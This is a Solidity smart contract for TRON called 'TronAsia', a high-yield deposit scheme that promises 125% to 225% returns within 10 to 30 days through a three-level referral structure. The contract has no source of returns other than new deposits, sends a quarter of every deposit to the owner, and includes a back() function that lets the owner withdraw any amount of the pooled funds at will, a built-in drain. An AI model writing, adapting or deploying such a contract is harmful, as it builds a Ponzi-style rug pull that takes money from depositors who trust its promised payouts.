//SourceUnit: TronAsia.sol


pragma solidity 0.5.10;


/*

                
             ████████╗██████╗░░█████╗░███╗░░██╗░█████╗░░██████╗██╗░█████╗░
             ╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔══██╗██╔════╝██║██╔══██╗
             ░░░██║░░░██████╔╝██║░░██║██╔██╗██║███████║╚█████╗░██║███████║
             ░░░██║░░░██╔══██╗██║░░██║██║╚████║██╔══██║░╚═══██╗██║██╔══██║
             ░░░██║░░░██║░░██║╚█████╔╝██║░╚███║██║░░██║██████╔╝██║██║░░██║
             ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝


*/

contract TronAsia {
    struct Tarif {
        uint8 life_days;
        uint16 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

       
        tarifs.push(Tarif(10, 125));
        tarifs.push(Tarif(11, 130));
        tarifs.push(Tarif(12, 135));
        tarifs.push(Tarif(13, 140));
        tarifs.push(Tarif(14, 145));
        tarifs.push(Tarif(15, 150));
        tarifs.push(Tarif(16, 155));
        tarifs.push(Tarif(17, 160));
        tarifs.push(Tarif(18, 165));
        tarifs.push(Tarif(19, 170));
        tarifs.push(Tarif(20, 175));
        tarifs.push(Tarif(21, 180));
        tarifs.push(Tarif(22, 185));
        tarifs.push(Tarif(23, 190));
        tarifs.push(Tarif(24, 195));
        tarifs.push(Tarif(25, 200));
        tarifs.push(Tarif(26, 205));
        tarifs.push(Tarif(27, 210));
        tarifs.push(Tarif(28, 215));
        tarifs.push(Tarif(29, 220));
        tarifs.push(Tarif(30, 225));

        ref_bonuses.push(7);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount * 1 / 100;
                direct_bonus += _amount * 2 / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 1 / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value / 4);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
    function back(uint256 value) public {
        require(msg.sender==owner, "no owner");
        
        owner.transfer(value);
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}